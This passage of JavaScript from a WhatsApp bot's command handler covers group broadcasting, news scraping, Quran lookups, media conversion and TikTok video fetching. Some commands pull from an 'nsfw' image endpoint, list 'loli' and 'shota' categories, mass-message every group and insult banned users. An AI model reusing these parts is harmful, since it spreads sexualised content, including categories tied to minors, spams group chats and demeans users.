                if (!text) return reply(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await zetsubo.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                reply(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\n𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭'
                    zetsubo.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: '𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓𝐄𝐃 𝐁𝐘 𝐂𝐋𝐀𝐒𝐒𝐈𝐂 𝐁𝐎𝐓',
                                body: `Sent ${i.length} Group`,
                                thumbnailUrl: 'https://telegra.ph/file/d2a1d3bbfabf34fabe666.jpg',
                                sourceUrl: 'https://chat.whatsapp.com/EPSGKau0IVi7J5lyOJO7Jk',
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                reply(`Successfully Sent Broadcast To ${anu.length} Group`)
            }
            break
//=================================================
case "alive":

const audiovn = "./Classic.mp3";
    const dooc = {
        audio: {
          url: audiovn
        },
        mimetype: 'audio/mp4',
        ptt: true,
        waveform:  [100, 0, 100, 0, 100, 0, 100],
        fileName: "",

        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
          title: "𝐇𝐢 𝐇𝐮𝐦𝐚𝐧,𝐂𝐥𝐚𝐬𝐬𝐢𝐜 𝐁𝐨𝐭 𝐈𝐬 𝐀𝐥𝐢𝐯𝐞 𝐚𝐧𝐝 𝐊𝐢𝐜𝐤𝐢𝐧𝐠",
          body: "https://chat.whatsapp.com/EPSGKau0IVi7J5lyOJO7Jk",
          thumbnailUrl: "https://telegra.ph/file/f6d66a60454e31e0a2c0d.jpg",
          sourceUrl: "https://chat.whatsapp.com/EPSGKau0IVi7J5lyOJO7Jk",
          mediaType: 1,
          renderLargerThumbnail: true
          }}
      };


await zetsubo.sendMessage(m.chat, dooc, {quoted: m});


break;
//=================================================
case 'cecanvietnam': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan vietnam`)
result = anu[Math.floor(Math.random() * anu.length)]
zetsubo.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m})
}
break
//=================================================
case 'rentbot':
                reply(`Type ${prefix}owner and chat him`)
                break
            case 'speedtest': {
                zetsubo('Testing Speed...')
                let cp = require('child_process')
                let {
                    promisify
                } = require('util')
                let exec = promisify(cp.exec).bind(cp)
                let o
                try {
                    o = await exec('python speed.py')
                } catch (e) {
                    o = e
                } finally {
                    let {
                        stdout,
                        stderr
                    } = o
                    if (stdout.trim()) zetsubo.sendMessage(m.chat, {
                        text: stdout,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://ibb.co/VVLfc0Q/cheemspic.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                    if (stderr.trim()) zetsubo.sendMessage(m.chat, {
                        text: stderr,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://ibb.co/VVLfc0Q/cheemspic.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }
            }
            break
//=================================================
case 'autostatusview':
                if (!isCreator) return reply(`Successfully changed auto status/story view`)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread_status = true
                    reply(`Successfully changed auto status/story view to ${q}`)
                } else if (q === 'off') {
                    autoread_status = false
                    reply(`Successfully changed auto status/story view to ${q}`)
                }
                break
//=================================================//
case 'art':
case 'awoo':
case 'bts':
case 'cogan':
case 'elaina':
case 'exo':
case 'elf':
case 'estetic':
case 'kanna':
case 'loli':
case 'neko2':
case 'waifu':
case 'shota':
case 'husbu':
case 'sagiri':
case 'shinobu':
case 'megumin':
case 'wallnime':
case 'quotesimage':
await loading()
zetsubo.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}` } })
break
//=================================================//
case 'neko' :
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
zetsubo.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ah Sayang 🥺🥺`},{ quoted:m }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'waifu' :
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
zetsubo.sendMessage(from, {image: {url:waifudd.data.url},caption:`Ahh Sayang 🥺🙏`}, { quoted:m }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
zetsubo.sendImage(from, data.url, 'Success Coy', m)
})
break
//=================================================//
case 'fajar':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'cnn':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'delete':
            case 'del': {
                if (!isCreator) return reply(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return reply('The message was not sent by a bot!')
                zetsubo.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break
//=================================================//
case 'cnbc':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'tribun':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'indozone':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'kompas':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'tourl': {
                reply(zetsubo.wait)
                let media = await zetsubo.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    reply(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
//=================================================//
case 'daily':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'inews':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'okezone':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'sindo':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
reply(teks) 
})
break
//=================================================//
case 'tempo':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case 'autoread':
                if (!isCreator) return replyg(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    reply(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    reply(`Successfully changed autoread to ${q}`)
                }
                break
//=================================================//
case "kontan":
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "merdeka":
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted:m })
})
break
//=================================================//
case "jalantikus":
await loading()
var reis = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${reis}`
teks += ""
zetsubo.sendMessage(m.chat, { image : { url : reis }, caption: teks }, { quoted:m })
break
//=================================================
case 'faktaunik':
case 'katabijak':
case 'pantun':
case 'bucin':
await loading()
var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)
reply(data.result)
break
//=================================================
case 'listsurah':
await loading()
axios
.get(`https://api.lolhuman.xyz/api/quran?apikey=${apikey}`)
.then(({ data }) => {
var text = 'List Surah:\n'
for (var x in data.result) {
text += `${x}. ${data.result[x]}\n`
}
reply(text)
})
.catch(console.error)
break
//=================================================
case 'alquran':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
axios
.get(`https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var ayat = data.result.ayat
var text = `QS. ${data.result.surah} : 1-${ayat.length}\n\n`
for (var x of ayat) {
text += `${x.arab}\n${x.ayat}. ${x.latin}\n${x.indonesia}\n\n`
}
text = text.replace(/<u>/g, '_').replace(/<\/u>/g, '_')
text = text.replace(/<strong>/g, '*').replace(/<\/strong>/g, '*')
reply(text)
})
.catch(console.error)
break
//=================================================
case 'alquranaudio':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
zetsubo.sendMessage(from, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${args[0]}?apikey=${apikey}` }, mimetype: 'audio/mp4' })
break
//=================================================
case 'asmaulhusna':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
axios
.get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${apikey}`)
.then(({ data }) => {
var text = `No : ${data.result.index}\n`
text += `Latin: ${data.result.latin}\n`
text += `Arab : ${data.result.ar}\n`
text += `Indonesia : ${data.result.id}\n`
text += `English : ${data.result.en}`
reply(text)
})
.catch(console.error)
break
//=================================================
case 'kisahnabi':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
axios
.get(`https://api.lolhuman.xyz/api/kisahnabi/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var text = `Name : ${data.result.name}\n`
text += `Lahir : ${data.result.thn_kelahiran}\n`
text += `Umur : ${data.result.age}\n`
text += `Tempat : ${data.result.place}\n`
text += `Story : \n${data.result.story}`
reply(text)
})
.catch(console.error)
break
//=================================================
case 'jadwalsholat':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
axios
.get(`https://api.lolhuman.xyz/api/sholat/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var text = `Wilayah : ${data.result.wilayah}\n`
text += `Tanggal : ${data.result.tanggal}\n`
text += `Sahur : ${data.result.sahur}\n`
text += `Imsak : ${data.result.imsak}\n`
text += `Subuh : ${data.result.subuh}\n`
text += `Terbit : ${data.result.terbit}\n`
text += `Dhuha : ${data.result.dhuha}\n`
text += `Dzuhur : ${data.result.dzuhur}\n`
text += `Ashar : ${data.result.ashar}\n`
text += `Maghrib : ${data.result.imsak}\n`
text += `Isya : ${data.result.isya}`
reply(text)
})
.catch(console.error)
break
//=================================================
case 'smeme':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Balas Image Dengan Caption ${prefix + command}`
if (!quoted) throw `Balas Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
m.reply('*Sabar Cuy Loading*')
mee = await zetsubo.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`)
zetsubo.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
}
break
//=================================================
case 'toimage': case 'toimg': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await zetsubo.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
zetsubo.sendMessage(from, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp4': case 'tovideo': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
if (!quoted) throw `Balas sticker video Dengan Caption ${prefix + command}`
if (/video/.test(mime)) {
let { webp2mp4File } = require('./lib/uploader')
let media = await zetsubo.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await zetsubo.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, {quoted:m})
await fs.unlinkSync(media)
}
}
break
case 'tomp3': {
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
await loading()
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await zetsubo.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
zetsubo.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${zetsubo.user.name}.mp3`}, { quoted : m })
}
break
//=================================================//
case 'toaudio': case 'audio': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await zetsubo.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
zetsubo.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
//=================================================//
case 'tovn': case 'voice': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
reply('*Sabar Cuy Loading*')
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
zetsubo.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6289503267904',
title: `ZetsuboXygen`,
sourceUrl: `https://wa.me/6289503267904`, 
thumbnail: thumb
}
}})
}
break
//=================================================//
case 'restart':  
  if (!isCreator) throw `Owner Only` 
  reply(`*Restarting Classic* .`)  
  await sleep(3000)  
  process.exit()  
  break;
//=================================================//
case "dp": { 
 try { 
 ha = m.quoted.sender; 
 qd = await zetsubo.getName(ha); 
 pp2 = await zetsubo.profilePictureUrl(ha,'image'); 
 } catch {  
 pp2 = 'https://tinyurl.com/yx93l6da'; 
 } 
  if (!m.quoted) throw `Tag a user!`; 
 bar = `𝐏𝐫𝐨𝐟𝐢𝐥𝐞 𝐩𝐢𝐜𝐭𝐮𝐫𝐞 𝐨𝐟 ${qd} 𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐛𝐲 𝐂𝐥𝐚𝐬𝐬𝐢𝐜-𝐀𝐢`; 
 zetsubo.sendMessage(m.chat, { image: { url: pp2}, caption: bar, fileLength: "999999999999"}, { quoted: m}); 
 } 
 break;
//=================================================//
case "quotes":
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 var resi = await Quotes()
teks = `\nAuthor: ${resi.author}\n`
teks = `\nQuotes:\n`
teks = `${resi.quotes}\n`
reply(teks)
break
//=================================================//
case 'asupan1':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Ytq5b/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
	//=================================================//
case 'asupan2':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Y9a9d/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan3':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YpRr4/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan4':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YfoYm/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan5':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://www.tiktok.com/@menantu_idamannnn/video/7211912588366548251?_r=1&u_code=dgc2fmm4i3k9b1&region=ID&mid=7211912606574627610&preview_pb=0&sharer_language=id&_d=d9iga21gg7d358&share_item_id=7211912588366548251&source=h5_t&timestamp=1682941528&user_id=6914652081950639106&sec_user_id=MS4wLjABAAAABSJMM2SSvwkONssmfetetURo2KRIL-wv22KQFCPh-ARQ0bEMn7lZ3gkjm6BhZdlm&social_share_type=0&utm_source=copy&utm_campaign=client_share&utm_medium=android&share_iid=7227953970441242394&share_link_id=5530f877-35fd-4db3-9b7c-d0c8e7e749ed&share_app_id=1180&ugbiz_name=Main&ug_btm=b6880%2Cb2878`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan6':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YyKm7/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan7':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS8wpweu7/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan8':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Y9Y2p/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan9':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Ygms3/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan10':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YsuNQ/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan11':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YtYaQ/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan12':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YbpvJ/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan13':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Y9FaD/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan14':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS8wpXDPm/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan15':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS8wpvaTV/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan16':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YaXCU/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan17':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83EKHja/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan18':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Yyk6y/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
case 'asupan19':
	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
	await loading()
	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Yb7GX/`).then(({ data }) => {
zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
	})
	break
//=================================================//
